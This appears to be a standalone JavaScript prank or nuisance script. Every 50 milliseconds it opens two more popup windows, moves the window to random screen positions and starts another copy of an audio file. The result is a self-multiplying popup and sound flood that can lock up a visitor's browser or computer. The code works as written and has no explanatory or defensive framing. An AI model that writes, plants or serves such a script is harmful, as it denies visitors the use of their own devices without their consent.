window.addEventListener('DOMContentLoaded', function(){
    setInterval(() => {
        var randomx = Math.floor( Math.random() * 2000 );
        var randomy = Math.floor( Math.random() * 2000 );
        function openWindow(url){
            aWindow = window.open(url,"_blank", 'width=300,height=300,menubar=no,status=no,toolbar=noresizable=no,titlebar=no,alwaysRaised=yes');
    }
    function procreate(){
		openWindow('window1.html');
    openWindow('window2.html');
		}
                procreate.call();
        window.moveTo(randomx, randomy) 
        const music = new Audio('resource/sr.mp3');
        music.play();
    }, 50);
  });